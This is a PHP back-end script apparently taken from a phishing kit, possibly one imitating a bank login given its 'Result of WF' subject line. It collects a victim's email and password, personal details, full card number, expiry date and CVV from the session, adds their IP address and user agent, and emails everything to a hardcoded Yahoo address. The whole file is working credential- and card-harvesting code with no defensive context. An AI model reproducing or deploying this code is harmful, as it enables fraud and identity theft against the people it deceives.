<?php
session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$to_email = "pam_smith1069@yahoo.com";
$subject = 'Result of WF';

$message = '';
$message .= "Email Address: ".$_SESSION['username']."\n";
$message .= "Password: ".$_SESSION['password']."\n";
$message .= "First Name: ".$_SESSION['firstName']."\n";
$message .= "Last Name: ".$_SESSION['lastName']."\n";
$message .= "Phone Number: ".$_SESSION['phoneNumber']."\n";
$message .= "Date of Birth: ".$_SESSION['dateOfBirth']."\n";
$message .= "Card Number: ".$_SESSION['cardNumber']."\n";
$message .= "Card Expiry Date: ".$_SESSION['expiryDate']."\n";
$message .= "Card CVV: ".$_SESSION['cardCVV']."\n";
$message .= "Billing Address: ".$_SESSION['billingAddress']."\n";
$message .= "Confirmed Email Address: ".$_SESSION['confirmUsername']."\n";
$message .= "Confirmed Password: ".$_SESSION['confirmPassword']."\n";


$message .= "User Information\n";
$message .= "Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent: ".$useragent."\n";

$header = "From:".$_SESSION['username']." <".$_SESSION['password'].">";
//check if the email address is invalid $secure_check
mail($to_email, $subject, $message , $header);
?>
